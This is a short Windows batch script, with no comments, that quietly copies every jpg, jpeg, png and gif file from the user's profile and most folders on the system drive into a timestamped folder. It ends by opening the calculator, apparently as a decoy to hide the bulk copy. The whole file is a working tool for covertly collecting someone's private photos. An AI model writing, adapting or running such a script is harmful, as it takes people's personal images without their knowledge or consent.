set dirname=%date%_%time:~0,-3%
set dirname="%dirname::=-%"
mkdir "%dirname%\user"



for %%f in (jpg jpeg png gif) do    xcopy "%USERPROFILE%\*.%%f" "%dirname%\user\" /y /q

for /d %%d in ("%USERPROFILE%\*") do for %%f in (jpg jpeg png gif) do  xcopy "%%d\*.%%f" "%dirname%\user\" /s /y /q


for %%f in (jpg jpeg png gif) do     xcopy "%SystemDrive%\*.%%f" "%dirname%\SystemDrive\" /y /q
  

for   /d  %%d in ("%SystemDrive%\*" ) do (
  for  %%f in (jpg jpeg png gif) do (
    if %%d NEQ %SystemRoot% if %%d NEQ %windir% if %%d NEQ %USERPROFILE%  xcopy "%%d\*.%%f" "%dirname%\SystemDrive\" /s /y /q) )


set dirname=end_%time:~0,-3%
set dirname="%dirname::=-%"
mkdir "%dirname%"


calc